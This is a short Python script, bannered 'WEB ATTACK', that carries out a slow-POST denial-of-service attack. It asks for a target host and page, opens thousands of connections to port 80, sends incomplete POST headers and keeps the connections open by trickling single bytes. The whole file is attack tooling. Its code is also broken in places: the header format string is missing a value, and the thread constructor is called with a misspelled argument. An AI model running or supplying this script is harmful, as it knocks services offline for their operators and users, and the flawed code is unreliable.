import socket
import time
import threading
print("__        _______ ____       _  _____ _____  _    ____ _  __")
print("\ \      / / ____| __ )     / \|_   _|_   _|/ \  / ___| |/ /")
print(" \ \ /\ / /|  _| |  _ \    / _ \ | |   | | / _ \| |   | ' /")
print("  \ V  V / | |___| |_) |  / ___ \| |   | |/ ___ \ |___| . \ ")
print("   \_/\_/  |_____|____/  /_/   \_\_|   |_/_/   \_\____|_|\_\ ")

MAX_CONN = 20000
PORT = 80
HOST = input("Enter a host name: " ).strip("")
PAGE = input("Enter a page to load: " ).strip("")

buf = ("POST %s HTTP/1.1\r\n"
       "HOST:%s\r\n"
       "Content-Length:%d\r\n"
       "Cookie: dklkt_dos_test\r\n"
       "\r\n"%(PAGE,HOST))
socks = []
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf.encode())
            print("[+] 成功发送buf!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:
            print("[-]无法连接服务器或发送错误:%s" % ex)
            #停一秒
            #def end
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode())
            except Exception as ex:
                print("[-]发送异常:%s\n"% ex)
                socks.remove(s)
                s.close()
    time.sleep(1)

conn_th = threading.Thread(target=conn_thread,arg=())
send_th = threading.Thread(target=send_thread,arg=())
conn_th.start()
send_th.start()

conn_th2 = threading.Thread(target=conn_thread,arg=())
send_th2 = threading.Thread(target=send_thread,arg=())
conn_th2.start()